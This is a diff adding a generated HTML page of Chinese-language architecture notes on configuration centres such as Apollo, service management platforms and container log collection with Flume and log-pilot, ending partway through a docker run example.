@@ -1,0 +1,1396 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><title>architect/架构师 · 博客</title><meta name="viewport" content="width=device-width"/><meta name="generator" content="Docusaurus"/><meta name="description" content="智能互联网之核心技术实践篇"/><meta name="docsearch:language" content="en"/><meta property="og:title" content="architect/架构师 · 博客"/><meta property="og:type" content="website"/><meta property="og:url" content="https://your-docusaurus-test-site.com/"/><meta property="og:description" content="智能互联网之核心技术实践篇"/><meta name="twitter:card" content="summary"/><link rel="shortcut icon" href="/img/favicon.ico"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/docsearch.js/1/docsearch.min.css"/><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css"/><link rel="alternate" type="application/atom+xml" href="https://your-docusaurus-test-site.com/blog/atom.xml" title="博客 Blog ATOM Feed"/><link rel="alternate" type="application/rss+xml" href="https://your-docusaurus-test-site.com/blog/feed.xml" title="博客 Blog RSS Feed"/><script type="text/javascript" src="https://buttons.github.io/buttons.js"></script><script src="/js/scrollSpy.js"></script><link rel="stylesheet" href="/css/main.css"/><script src="/js/codetabs.js"></script></head><body class="sideNavVisible separateOnPageNav"><div class="fixedHeaderContainer"><div class="headerWrapper wrapper"><header><a href="/"><img class="logo" src="/img/favicon.ico" alt="博客"/><h2 class="headerTitleWithLogo">博客</h2></a><div class="navigationWrapper navigationSlider"><nav class="slidingNav"><ul class="nav-site nav-site-internal"><li class=""><a href="/docs/directory" target="_self">Docs</a></li><li class=""><a href="/blog/" target="_self">Blog</a></li><li class="navSearchWrapper reactNavSearchWrapper"><input type="text" id="search_input_react" placeholder="Search" title="Search"/></li></ul></nav></div></header></div></div><div class="navPusher"><div class="docMainWrapper wrapper"><div class="container mainContainer docsContainer"><div class="wrapper"><div class="post"><header class="postHeader"><h1 id="__docusaurus" class="postHeaderTitle">architect/架构师</h1></header><article><div><span><h1><a class="anchor" aria-hidden="true" id="智能互联网之核心技术实践篇"></a><a href="#智能互联网之核心技术实践篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之核心技术实践篇</h1>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之关键系统实践篇"></a><a href="#智能互联网之关键系统实践篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之关键系统实践篇</h1>
+<h2><a class="anchor" aria-hidden="true" id="配置中心设计与实践"></a><a href="#配置中心设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>配置中心设计与实践</h2>
+<h3><a class="anchor" aria-hidden="true" id="配置中心定义"></a><a href="#配置中心定义" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>配置中心定义</h3>
+<p>应用服务配置统一存储和管理的可视化系统。</p>
+<p><strong>配置</strong></p>
+<p>配置是独立与程序的只读变量</p>
+<p>配置伴随应用的整个生命周期</p>
+<p>配置可以有多种加载方式：热加载、重启加载</p>
+<p>配置需要治理（权限控制，不同环境、集群配置管理）</p>
+<h3><a class="anchor" aria-hidden="true" id="配置中心目的"></a><a href="#配置中心目的" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>配置中心目的</h3>
+<p>1、服务重启的成本高</p>
+<p>2、随着程序功能的日益复杂、程序的配置日益增多：各种功能的开关、参数的配置、服务器的地址等</p>
+<p>3、对配置的期望也越来越高，配置修改后实时生效、灰度发布，分环境、分集群管理配置，完善的权限审核机制</p>
+<p>4、采用分布式的开发模式，随着服务的不断增多，项目之间的调用复杂度成指数升高，每次上线新的项目时苦不堪言，需要把配置的部分从项目中剥离出来，因此需要配置中心</p>
+<h3><a class="anchor" aria-hidden="true" id="为什么不采用zk，etcd？"></a><a href="#为什么不采用zk，etcd？" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>为什么不采用ZK，etcd？</h3>
+<p>1、ZooKeeper、etcd等没有方便的UI管理工具，且缺乏权限、审核机制</p>
+<p>2、最重要的是，ZooKeeper和etcd定义为分布式服务协调器，统一配置中心的事情交给专业的系统去解决</p>
+<h3><a class="anchor" aria-hidden="true" id="开源配置中心"></a><a href="#开源配置中心" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>开源配置中心</h3>
+<p>1、Spring Cloud Config：Spring出品和Spring Cloud无缝融合</p>
+<p>2、淘宝diamond：针对Spring框架定制，<strong>已不再维护</strong></p>
+<p>3、百度Disconf：针对Spring、非Spring项目无法使用</p>
+<p>4、携程Apollo：是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境，不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景</p>
+<p>对比纬度         Spring Cloud Config   Ctrip Apollo      Disconf</p>
+<hr>
+<p>本地配置缓存     不支持                支持              支持
+配置生效时间     重启生效              实时              实时
+配置版本管理     不支持                界面直接支持      不支持
+灰度发布         不支持                支持              支持不完善
+多环境           不支持                支持              支持
+报警通知         不支持                支持邮件          支持邮件
+配置界面         不支持                支持              支持
+客户端支持       Java                  Java，Net，Http   Java
+业务系统侵入性   低                    低                低
+单点故障         支持HA                支持HA            支持HA
+多数据中心支持   支持                  支持              支持
+依赖组件         Eurake                Eurake            ZooKeeper
+自身语音         Java                  Java              Java</p>
+<h3><a class="anchor" aria-hidden="true" id="推荐：携程apollo，配置中心也应该是一个ap模型"></a><a href="#推荐：携程apollo，配置中心也应该是一个ap模型" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>推荐：携程Apollo，配置中心也应该是一个AP模型</h3>
+<p>1、统一管理不同环境、不同集群配置：Apollo提供了一个统一界面集中式管理不同环境（environment），不同集群（cluster），不同命名空间（namespace）的配置</p>
+<p>2、配置修改实时生效（热发布）：用户在Apollo修改完配置并发布后，客户端能实时（1s）接收到最新的配置，并通知到应用程序</p>
+<p>3、版本发布管理：所有的配置发布都会有版本概念，从而可以方便的支持配置的回滚</p>
+<p>4、权限管理、发布审核、操作审计</p>
+<p>5、客户端配置信息监控：可以方便的看到配置在被哪些实例使用</p>
+<p>6、提供Java和Net原生客户端，同时提供了Http接口，非Java和Net应用可以方便的使用</p>
+<p>7、部署简单：</p>
+<p>a）配置中心作为基础服务，可用性要求非常高，这就要求Apollo对外部依赖尽可能地少</p>
+<p>b）目前唯一的外部依赖是MySQL，所以部署非常简单，只要安装好Java和MySQL就可以让Apollo跑起来</p>
+<p>c）Apollo还提供了打包脚本，一键就可以生成所有需要的安装包，并且支持自定义运行时参数</p>
+<p>7、提供开发平台API：对于有些使用方，他们的配置可能会比较复杂，如，XML、JSON，需要对格式做校验，提供开放接口自定义</p>
+<h3><a class="anchor" aria-hidden="true" id="自研配置中心"></a><a href="#自研配置中心" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>自研配置中心</h3>
+<p><img src="media/image44.png" alt="">{width=&quot;4.604930008748906in&quot;
+height=&quot;3.179867672790901in&quot;}</p>
+<p>配置项变更如何通知ZK？</p>
+<p>比如配置项：CRM项目Order模块下的创建订单超时时，可在ZooKeeper中创建目录/crm/order/create-time-out，Application监控整个目录，应用配置变更时，修改配置的版本号。</p>
+<h2><a class="anchor" aria-hidden="true" id="服务管理平台设计与实践"></a><a href="#服务管理平台设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务管理平台设计与实践</h2>
+<p>服务管理平台：</p>
+<p>服务管理平台抽象出服务特征，对服务提供者和服务调用者分别提供可视化管理界面</p>
+<p>服务发布之前需要注册</p>
+<p>调用服务必须通过工单申请，经过服务提供方同意（提供PRCkey授权），按需申请，按需调用</p>
+<p>功能：</p>
+<p>管理：双发平台注册、在线管理、平台发布管控指令、配置管理、服务熔断/降级、调用关系控制</p>
+<p>度量：服务质量、健康指数、问题追逐</p>
+<p>监控：多维度流量监控、实时准确、告警、流量控制</p>
+<h2><a class="anchor" aria-hidden="true" id="智能个性化推荐系统设计与实践"></a><a href="#智能个性化推荐系统设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能个性化推荐系统设计与实践</h2>
+<h2><a class="anchor" aria-hidden="true" id="智能搜索引擎系统设计与实践"></a><a href="#智能搜索引擎系统设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能搜索引擎系统设计与实践</h2>
+<h2><a class="anchor" aria-hidden="true" id="千亿级真实案例实践"></a><a href="#千亿级真实案例实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>千亿级真实案例实践</h2>
+<h2><a class="anchor" aria-hidden="true" id="eurake"></a><a href="#eurake" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Eurake</h2>
+<h2><a class="anchor" aria-hidden="true" id="etcd"></a><a href="#etcd" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>etcd</h2>
+<h2><a class="anchor" aria-hidden="true" id="consul"></a><a href="#consul" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Consul</h2>
+<h2><a class="anchor" aria-hidden="true" id="zookeeper"></a><a href="#zookeeper" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ZooKeeper</h2>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之容器弹性云与servicemesh实践篇"></a><a href="#智能互联网之容器弹性云与servicemesh实践篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之容器弹性云与Service+Mesh实践篇</h1>
+<h2><a class="anchor" aria-hidden="true" id="docker容器技术揭秘"></a><a href="#docker容器技术揭秘" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Docker容器技术揭秘</h2>
+<h2><a class="anchor" aria-hidden="true" id="kubernetes容器管理技术揭秘"></a><a href="#kubernetes容器管理技术揭秘" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Kubernetes容器管理技术揭秘</h2>
+<h2><a class="anchor" aria-hidden="true" id="大规模容器弹性云平台设计与实践"></a><a href="#大规模容器弹性云平台设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>大规模容器弹性云平台设计与实践</h2>
+<p><img src="media/image46.png" alt="">{width=&quot;5.18784886264217in&quot;
+height=&quot;2.3032863079615047in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="容器日志收集开源方案"></a><a href="#容器日志收集开源方案" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>容器日志收集开源方案</h3>
+<h4><a class="anchor" aria-hidden="true" id="方案一：应用和flume部署在同一pod"></a><a href="#方案一：应用和flume部署在同一pod" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>方案一：应用和Flume部署在同一Pod</h4>
+<p><img src="media/image47.png" alt="">{width=&quot;3.155465879265092in&quot;
+height=&quot;1.5943405511811024in&quot;}</p>
+<p>正常情况下应用打印一条日志，Flume采集一条，不会出问题，但可能存在阻塞的情况，Flume采集暂时没有跟上日志的打印速度。这个时候容器/pod关闭时，没来得及的采集的日志会丢失。</p>
+<h4><a class="anchor" aria-hidden="true" id="方案二：日志实时采集落到宿主机flume采集宿主机日志"></a><a href="#方案二：日志实时采集落到宿主机flume采集宿主机日志" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>方案二：日志实时采集落到宿主机+Flume采集宿主机日志</h4>
+<p><img src="media/image48.png" alt="">{width=&quot;3.6292563429571305in&quot;
+height=&quot;1.6735444006999125in&quot;}</p>
+<p>log-pilot独立容器，阿里开源，支持增量采集/断点续传。</p>
+<p>日志如何产生及存储：容器内的业务程序通过日志插件（如Log4j2）将日志输出到容器内某个目录，容器的目录是挂载在宿主机某个磁盘。</p>
+<p>日志采集面临的问题：容器目录挂载在宿主磁盘的目录是根据容器信息生成的，而不是根据业务生成的，则无法提前知道应该去哪个目录采集日志。</p>
+<h4><a class="anchor" aria-hidden="true" id="log-pilot"></a><a href="#log-pilot" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>log-pilot</h4>
+<p>log-pilot是阿里云开源的一款实时采集容器日志的工具，其本身也是一个容器，是通过容器之间的通信来监听宿主机上其它容器的事件动态，log-polit容器内会启动一个采集程序（目前支持Fluentd和Filebeat），监听到其它容器的状态后，根据Docker的API拿到该容器的信息，拼接出容器Log所在的目录，由采集程序去采集。</p>
+<p>log-pilot和业务日志对接，采用的是evn变量设置</p>
+<p><strong>方式一：Docker启动通过命令行设置env环境变量方式</strong></p>
+<p>Tomcat设置env环境变量</p>
+<p>docker run --it --rm --p 20020:2020 --v /opt/tomcat/log --label
+alyun.logs.catalina=stdout --label
